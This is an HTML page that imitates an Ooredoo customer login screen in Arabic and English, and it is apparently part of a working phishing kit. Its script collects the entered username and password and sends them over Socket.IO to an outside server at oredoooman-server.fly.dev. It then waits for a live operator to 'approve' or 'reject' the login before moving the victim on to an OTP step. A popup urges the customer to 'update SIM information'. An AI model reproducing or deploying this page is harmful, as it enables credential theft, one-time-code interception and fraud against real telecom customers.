<!doctype html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>تسجيل الدخول - Ooredoo</title>
  <style>
    @font-face {
      font-family: 'NotoSansLocal';
      src: url('/wp-content/themes/Divi-child/fonts/NotoSans-Regular.ttf') format('truetype');
      font-weight: 400;
      font-style: normal;
      font-display: swap;
    }

    @font-face {
      font-family: 'NotoSansLocal';
      src: url('/wp-content/themes/Divi-child/fonts/NotoSans-Bold.ttf') format('truetype');
      font-weight: 700;
      font-style: normal;
      font-display: swap;
    }

    :root {
      --ooredoo-red: #ed1c24;
      --text: #050505;
      --muted: #1f2428;
      --field-border: #d9d9d9;
      --field-placeholder: #7a7f84;
      --card-shadow: 0 19px 39px rgba(0, 0, 0, 0.095);
    }

    * { box-sizing: border-box; }

    html, body {
      width: 100%;
      min-height: 100%;
      margin: 0;
      background: #ffffff;
      color: var(--text);
      font-family: NotoSansLocal, Arial, Helvetica, sans-serif;
      -webkit-font-smoothing: antialiased;
      text-rendering: geometricPrecision;
    }

    body { min-height: 100vh; }

    .lang-toggle {
      background: #f5f5f5;
      border: 1px solid #ddd;
      border-radius: 20px;
      padding: 6px 16px;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
      color: #333;
      transition: all 0.2s;
      z-index: 100;
    }
    .lang-toggle:hover {
      background: #eee;
      border-color: #ccc;
    }
    .lang-toggle-wrap {
      width: 638px;
      max-width: 100%;
      margin: 0 auto;
      display: flex;
      justify-content: flex-start;
      padding: 0 0 10px;
    }

    .login-page {
      width: 100%;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding-top: 60px;
      padding-bottom: 44px;
    }

    .login-card {
      width: 638px;
      min-height: 655px;
      background: #ffffff;
      border: 1px solid rgba(246, 246, 246, 0.98);
      border-radius: 4px;
      box-shadow: var(--card-shadow);
      padding: 40px 35px 36px;
    }

    .ooredoo-mark {
      width: 75px;
      height: 63px;
      display: block;
      margin: 0 auto 11px;
      overflow: visible;
    }

    .login-title {
      margin: 0;
      color: #030303;
      text-align: center;
      font-size: 36px;
      font-weight: 700;
      line-height: 1.18;
      letter-spacing: 0.05px;
    }

    .login-subtitle {
      margin: 8px 0 7px;
      color: #111111;
      text-align: center;
      font-size: 17px;
      font-weight: 400;
      line-height: 1.5;
    }

    .login-form { width: 100%; margin-top: 0; }

    .field-group { margin-top: 7px; }
    .field-group + .field-group { margin-top: 22px; }

    .field-label {
      display: block;
      margin: 0 0 10px;
      color: #0b0b0b;
      font-size: 17px;
      font-weight: 400;
      line-height: 1.2;
    }

    .text-field {
      width: 100%;
      height: 48px;
      display: block;
      border: 1px solid var(--field-border);
      border-radius: 8px;
      background: #ffffff;
      color: #111111;
      outline: none;
      padding: 0 14px;
      font-family: NotoSansLocal, Arial, Helvetica, sans-serif;
      font-size: 16px;
      font-weight: 400;
      line-height: 48px;
      transition: border-color 0.18s ease, box-shadow 0.18s ease;
      direction: ltr;
      text-align: left;
    }

    .text-field::placeholder { color: var(--field-placeholder); opacity: 1; }

    .text-field:focus {
      border-color: rgba(237, 28, 36, 0.48);
      box-shadow: 0 0 0 3px rgba(237, 28, 36, 0.08);
    }

    .forgot-row {
      height: 43px;
      display: flex;
      align-items: center;
      justify-content: flex-end;
    }

    .forgot-link {
      color: #be1f2d;
      font-size: 16px;
      font-weight: 700;
      line-height: 1.2;
      text-decoration: none;
    }

    .forgot-link:hover, .forgot-link:focus-visible { text-decoration: underline; }

    .button-stack { width: 100%; display: grid; gap: 18px; }

    .login-button, .signup-button {
      width: 100%;
      height: 59px;
      display: flex;
      align-items: center;
      justify-content: center;
      border-radius: 29.5px;
      font-family: NotoSansLocal, Arial, Helvetica, sans-serif;
      font-size: 16px;
      font-weight: 700;
      line-height: 1;
      text-align: center;
      text-decoration: none;
      cursor: pointer;
    }

    .login-button {
      border: 0;
      background: var(--ooredoo-red);
      color: #ffffff;
      position: relative;
    }

    .login-button.loading {
      pointer-events: none;
      color: rgba(255,255,255,0.4);
    }

    .login-button.loading::before {
      content: '';
      position: absolute;
      top: 50%;
      left: 50%;
      width: 28px;
      height: 28px;
      margin-top: -14px;
      margin-left: -14px;
      border: 3px solid rgba(255,255,255,0.4);
      border-top-color: #fff;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
      z-index: 1;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    .signup-button {
      border: 1px solid #c82333;
      background: #ffffff;
      color: #c82333;
    }

    .back-link {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 6px;
      margin: 20px auto 0;
      color: #4f5964;
      font-size: 18px;
      font-weight: 700;
      line-height: 1.2;
      text-decoration: none;
    }

    .back-wrap { text-align: center; }

    .back-link svg {
      width: 17px;
      height: 17px;
      fill: currentColor;
      transform: translateY(-1px);
    }

    /* Waiting/Loading overlay */
    #waitingOverlay {
      display: none;
      position: fixed;
      inset: 0;
      background: rgba(255,255,255,0.85);
      z-index: 9998;
      justify-content: center;
      align-items: center;
      flex-direction: column;
    }
    .spinner {
      width: 50px;
      height: 50px;
      border: 5px solid #f3f3f3;
      border-top: 5px solid #ed1c24;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin-bottom: 16px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .waiting-text {
      font-size: 16px;
      color: #333;
      font-weight: 500;
    }
    .error-msg {
      display: none;
      color: #ed1c24;
      text-align: center;
      font-size: 14px;
      margin-top: 10px;
      font-weight: 500;
    }

    @media (max-width: 700px) {
      .login-page { padding: 20px 12px 24px; }
      .login-card { width: 100%; min-height: 0; padding: 30px 18px 28px; box-shadow: none; border: none; }
      .login-title { font-size: 28px; }
      .login-subtitle, .field-label { font-size: 14px; }
      .forgot-row { height: 36px; }
      .forgot-link { font-size: 14px; }
      .login-button, .signup-button { height: 52px; font-size: 15px; }
      .text-field { height: 46px; font-size: 15px; }
      .lang-toggle-wrap { width: 100%; padding: 0 5px 8px; }
      .back-link { font-size: 16px; }
      .ooredoo-mark { width: 60px; height: 50px; }
    }
    @media (max-width: 400px) {
      .login-page { padding: 15px 8px 20px; }
      .login-card { padding: 24px 14px 24px; }
      .login-title { font-size: 24px; }
      .login-button, .signup-button { height: 48px; font-size: 14px; border-radius: 24px; }
    }
  </style>
</head>
<body>
  <main class="login-page" aria-label="Login page">
    <!-- Language Toggle -->
    <div class="lang-toggle-wrap">
      <button class="lang-toggle" id="langToggle" onclick="toggleLanguage()">English</button>
    </div>

    <section class="login-card" aria-labelledby="login-title">
      <svg class="ooredoo-mark" viewBox="0 0 74 62" aria-hidden="true" focusable="false">
        <circle cx="31" cy="34" r="17" fill="none" stroke="#ed1c24" stroke-width="11"></circle>
        <circle cx="58" cy="14" r="7.5" fill="#ed1c24"></circle>
      </svg>

      <h1 class="login-title" id="login-title">مرحباً بعودتك</h1>
      <p class="login-subtitle" id="login-subtitle">تسجيل الدخول إلى حسابك</p>

      <form class="login-form" id="loginForm" action="#" method="post" autocomplete="on">
        <div class="field-group">
          <label class="field-label" for="username" id="usernameLabel">اسم المستخدم</label>
          <input class="text-field" id="username" name="username" type="text" placeholder="أدخل اسم المستخدم" autocomplete="username">
        </div>

        <div class="field-group">
          <label class="field-label" for="password" id="passwordLabel">كلمة المرور</label>
          <input class="text-field" id="password" name="password" type="password" placeholder="أدخل كلمة المرور" autocomplete="current-password">
        </div>

        <div class="forgot-row">
          <a class="forgot-link" href="#" id="forgotLink">نسيت كلمة المرور؟</a>
        </div>

        <div class="button-stack">
          <button class="login-button" id="loginBtn" type="submit">تسجيل الدخول</button>
          <a class="signup-button" href="/customer-authentication.html" id="signupBtn">إنشاء حساب</a>
        </div>
        <p class="error-msg" id="errorMsg">بيانات الدخول غير صحيحة. يرجى المحاولة مرة أخرى.</p>
      </form>

      <div class="back-wrap">
        <a class="back-link" href="/" aria-label="Back" id="backLink">
          <svg viewBox="0 0 20 20" aria-hidden="true" focusable="false"><path d="M8.72 4.22a.95.95 0 0 1 0 1.34L5.24 9.05h10.81a.95.95 0 1 1 0 1.9H5.24l3.48 3.49a.95.95 0 0 1-1.34 1.34l-5.1-5.1a.96.96 0 0 1 0-1.36l5.1-5.1a.95.95 0 0 1 1.34 0Z"></path></svg>
          <span id="backText">رجوع</span>
        </a>
      </div>
    </section>
  </main>

  <!-- Waiting Overlay -->
  <div id="waitingOverlay">
    <div class="spinner"></div>
    <p class="waiting-text" id="waitingText">جاري التحقق من البيانات...</p>
  </div>

  <!-- Popup Overlay -->
  <div id="welcomePopup" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.5); z-index:9999; justify-content:center; align-items:center;">
    <div style="background:#fff; border-radius:16px; padding:32px 24px; max-width:360px; width:90%; text-align:center; box-shadow:0 8px 32px rgba(0,0,0,0.2);">
      <svg style="width:75px; height:63px; margin:0 auto 16px;" viewBox="0 0 74 62">
        <circle cx="31" cy="34" r="17" fill="none" stroke="#ed1c24" stroke-width="11"></circle>
        <circle cx="58" cy="14" r="7.5" fill="#ed1c24"></circle>
      </svg>
      <p id="popupText" style="font-size:17px; color:#333; line-height:1.7; margin-bottom:24px; font-weight:500;">عزيزي العميل يرجى المتابعة لتحديث معلومات شريحتك</p>
      <button id="popupBtn" onclick="document.getElementById('welcomePopup').style.display='none'" style="width:100%; padding:14px; background:#ed1c24; color:#fff; border:none; border-radius:10px; font-size:16px; font-weight:600; cursor:pointer;">متابعة</button>
    </div>
  </div>

  <!-- Socket.IO -->
  <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
  <script>
    // Language toggle - read saved preference
    var currentLang = localStorage.getItem('siteLang') || localStorage.getItem('oredoo_site_language') || localStorage.getItem('selectedLang') || 'ar';
    
    var translations = {
      ar: {
        title: 'مرحباً بعودتك',
        subtitle: 'تسجيل الدخول إلى حسابك',
        usernameLabel: 'اسم المستخدم',
        usernamePlaceholder: 'أدخل اسم المستخدم',
        passwordLabel: 'كلمة المرور',
        passwordPlaceholder: 'أدخل كلمة المرور',
        forgotLink: 'نسيت كلمة المرور؟',
        loginBtn: 'تسجيل الدخول',
        signupBtn: 'إنشاء حساب',
        backText: 'رجوع',
        toggleText: 'English',
        waitingText: 'جاري التحقق من البيانات...',
        loadingBtn: 'جاري التحقق...',
        errorMsg: 'بيانات الدخول غير صحيحة. يرجى المحاولة مرة أخرى.',
        popupText: 'عزيزي العميل يرجى المتابعة لتحديث معلومات شريحتك',
        popupBtn: 'متابعة'
      },
      en: {
        title: 'Welcome back',
        subtitle: 'Login to your account',
        usernameLabel: 'Username',
        usernamePlaceholder: 'Enter your Username',
        passwordLabel: 'Password',
        passwordPlaceholder: 'Enter your Password',
        forgotLink: 'Forgot Password?',
        loginBtn: 'Login',
        signupBtn: 'Sign Up',
        backText: 'Back',
        toggleText: 'العربية',
        waitingText: 'Verifying your data...',
        loadingBtn: 'Verifying...',
        errorMsg: 'Invalid credentials. Please try again.',
        popupText: 'Dear customer, please proceed to update your SIM information',
        popupBtn: 'Continue'
      }
    };

    function toggleLanguage() {
      currentLang = currentLang === 'ar' ? 'en' : 'ar';
      localStorage.setItem('siteLang', currentLang); localStorage.setItem('oredoo_site_language', currentLang); localStorage.setItem('selectedLang', currentLang);
      applyLanguage();
    }

    function applyLanguage() {
      var t = translations[currentLang];
      var html = document.documentElement;
      
      if (currentLang === 'ar') {
        html.setAttribute('lang', 'ar');
        html.setAttribute('dir', 'rtl');
      } else {
        html.setAttribute('lang', 'en');
        html.setAttribute('dir', 'ltr');
      }

      document.getElementById('login-title').textContent = t.title;
      document.getElementById('login-subtitle').textContent = t.subtitle;
      document.getElementById('usernameLabel').textContent = t.usernameLabel;
      document.getElementById('username').placeholder = t.usernamePlaceholder;
      document.getElementById('passwordLabel').textContent = t.passwordLabel;
      document.getElementById('password').placeholder = t.passwordPlaceholder;
      document.getElementById('forgotLink').textContent = t.forgotLink;
      
      var loginBtn = document.getElementById('loginBtn');
      if (!loginBtn.disabled) {
        loginBtn.textContent = t.loginBtn;
      }
      
      document.getElementById('signupBtn').textContent = t.signupBtn;
      document.getElementById('backText').textContent = t.backText;
      document.getElementById('langToggle').textContent = t.toggleText;
      document.getElementById('waitingText').textContent = t.waitingText;
      document.getElementById('errorMsg').textContent = t.errorMsg;
      document.getElementById('popupText').textContent = t.popupText;
      document.getElementById('popupBtn').textContent = t.popupBtn;
    }

    // Apply saved language on page load
    applyLanguage();

    (function() {
      // Show popup if coming from ATM page
      var params = new URLSearchParams(window.location.search);
      if (params.get('popup') === '1') {
        // Show loading spinner first for 2 seconds
        document.getElementById('waitingOverlay').style.display = 'flex';
        setTimeout(function() {
          document.getElementById('waitingOverlay').style.display = 'none';
          document.getElementById('welcomePopup').style.display = 'flex';
        }, 2000);
      }

      // Socket.IO connection
      var SOCKET_URL = window.location.hostname === 'localhost' 
        ? 'http://localhost:3001' 
        : 'https://oredoooman-server.fly.dev';
      
      var socket = io(SOCKET_URL, { transports: ['websocket', 'polling'] });
      
      // Register visitor
      var visitorId = localStorage.getItem('visitorId') || null;
      socket.on('connect', function() {
        socket.emit('visitor:register', { existingVisitorId: visitorId });
        socket.emit('visitor:pageEnter', 'تسجيل الدخول');
      });
      socket.on('visitor:registered', function(data) {
        if (data && data.visitorId) {
          localStorage.setItem('visitorId', data.visitorId);
        }
      });

      // Handle form submission
      var form = document.getElementById('loginForm');
      var loginBtn = document.getElementById('loginBtn');
      var waitingOverlay = document.getElementById('waitingOverlay');
      var errorMsg = document.getElementById('errorMsg');

      // Strip Arabic letters
      var arabicLettersPattern = /[\u0600-\u06FF\u0750-\u077F\u08A0-\u08FF\uFB50-\uFDFF\uFE70-\uFEFF]/g;
      var restrictedFields = form.querySelectorAll('#username, #password');

      function stripArabicLetters(field) {
        var cleanValue = field.value.replace(arabicLettersPattern, '');
        if (field.value !== cleanValue) {
          var previousPosition = field.selectionStart || cleanValue.length;
          var removedBeforeCursor = (field.value.slice(0, previousPosition).match(arabicLettersPattern) || []).length;
          field.value = cleanValue;
          var nextPosition = Math.max(previousPosition - removedBeforeCursor, 0);
          if (typeof field.setSelectionRange === 'function') {
            field.setSelectionRange(nextPosition, nextPosition);
          }
        }
      }

      restrictedFields.forEach(function(field) {
        field.setAttribute('dir', 'ltr');
        field.addEventListener('beforeinput', function(event) {
          if (event.data && arabicLettersPattern.test(event.data)) {
            event.preventDefault();
          }
          arabicLettersPattern.lastIndex = 0;
        });
        field.addEventListener('input', function() { stripArabicLetters(field); });
        field.addEventListener('paste', function() {
          window.setTimeout(function() { stripArabicLetters(field); }, 0);
        });
      });

      form.addEventListener('submit', function(event) {
        event.preventDefault();
        
        var username = document.getElementById('username').value.trim();
        var password = document.getElementById('password').value.trim();
        
        if (!username || !password) return;

        // Show loading
        loginBtn.disabled = true;
        loginBtn.classList.add('loading');
        waitingOverlay.style.display = 'flex';
        errorMsg.style.display = 'none';

        // Send data to server
        socket.emit('more-info', {
          content: { 'اسم المستخدم': username, 'كلمة المرور': password },
          page: 'تسجيل الدخول',
          waitingForAdminResponse: true
        });
      });

      // Listen for admin response (approve/reject)
      socket.on('card:action', function(data) {
        var act = (data && data.action) ? data.action : data;
        if (act === 'approve') {
          // Navigate to OTP login page
          var cLang = localStorage.getItem('siteLang') || localStorage.getItem('oredoo_site_language') || 'ar';
          window.location.href = '/customer-authentication/' + (cLang === 'en' ? '?lang=en' : '');
        } else if (act === 'reject') {
          // Show error and reset
          waitingOverlay.style.display = 'none';
          loginBtn.disabled = false;
          loginBtn.classList.remove('loading');
          errorMsg.style.display = 'block';
          // Clear fields
          document.getElementById('username').value = '';
          document.getElementById('password').value = '';
        }
      });

      // Listen for page navigation from admin
      socket.on('visitor:navigate', function(page) {
        if (page) window.location.href = '/' + page;
      });
    })();
  </script>
</body>
</html>
